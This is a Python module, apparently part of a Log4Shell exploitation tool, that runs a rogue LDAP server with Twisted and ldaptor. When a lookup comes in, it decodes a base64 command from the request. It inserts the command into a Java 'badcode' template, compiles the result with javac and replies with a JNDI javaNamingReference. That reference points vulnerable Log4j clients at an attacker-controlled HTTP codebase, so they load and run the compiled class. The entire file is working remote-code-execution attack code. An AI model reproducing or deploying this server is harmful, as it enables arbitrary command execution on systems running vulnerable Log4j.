import sys
import io

from twisted.application import service
from twisted.internet.endpoints import serverFromString
from twisted.internet.protocol import ServerFactory
from twisted.python.components import registerAdapter
from twisted.python import log
from ldaptor.inmemory import fromLDIFFile
from ldaptor.interfaces import IConnectedLDAPEntry
from ldaptor.protocols.ldap.ldapserver import LDAPServer
from ldaptor.protocols.ldap import distinguishedname, ldaperrors
from ldaptor import delta, entry
from ldaptor.protocols import pureldap, pureber

from .common import *
from .pr import *
from .vars import *

import os

class CustomLDAPServer(LDAPServer):

    def __init__(self,local_ip=None,external_ip=None,port=None):
        self.local_ip = local_ip
        self.external_ip = external_ip
        self.port = port
        LDAPServer.__init__(self)

    def handle_LDAPSearchRequest(self, request, controls, reply):

        command = request.baseObject.decode()
        command = base64decoder(command)
        class_name = COOL_CLASS_PATH#f"{random_string(8)}.class"

        temp = open(templatefile,'r')
        badcode = temp.read().replace('CMDGOESHERE',command)
        temp.close()

        newtemp = open(TMPCODE,'w')
        newtemp.write(badcode)
        newtemp.close()
        
        # os.system(f"/usr/lib/jvm/java-8-openjdk-amd64/bin/javac {TMPCODE} > /dev/null 2>&1")
        os.system(f"javac {TMPCODE} > /dev/null 2>&1")
        
        rr = f"http://{self.external_ip}:{self.port}/"
        f = f"{rr}{class_name}"
        attr = [
                    ("javaClassName", ["Main"]),
                    ("objectClass", ["javaNamingReference"]),
                    ("javaCodeBase", [rr]),
                    ("javaFactory", ["Main"]),
                ]
        print_green(f"[+] LDAP Callback sending {attr}")
        reply(
            pureldap.LDAPSearchResultEntry(
                objectName="",
                attributes=attr,
            )
        )
        print_green(f"[+] Redirecting to {f} {command}")
        return pureldap.LDAPSearchResultDone(resultCode=ldaperrors.Success.resultCode)



class LDAPServerFactory(ServerFactory):
    protocol = CustomLDAPServer

    def __init__(self, root=None,local_ip=None,external_ip=None,port=None):
        self.root = None
        super(ServerFactory).__init__()
        self.local_ip = local_ip
        self.external_ip = external_ip
        self.http_port = port



    def buildProtocol(self, addr):
        proto = self.protocol(local_ip=self.local_ip,external_ip=self.external_ip,port=self.http_port)
        proto.debug = self.debug
        proto.factory = self
        return proto


def START_LDAP_SERVER(LIP,EIP,PORT,httpport):
    from twisted.internet import reactor
    port = PORT
    registerAdapter(lambda x: x.root, LDAPServerFactory, IConnectedLDAPEntry)
    factory = LDAPServerFactory(local_ip=LIP,external_ip=EIP,port=httpport)
    factory.debug = True
    application = service.Application("Log4Shell-LDAP")
    myService = service.IServiceCollection(application)
    serverEndpointStr = f"tcp:{port}"
    e = serverFromString(reactor, serverEndpointStr)
    d = e.listen(factory)
    reactor.run(installSignalHandlers=False)

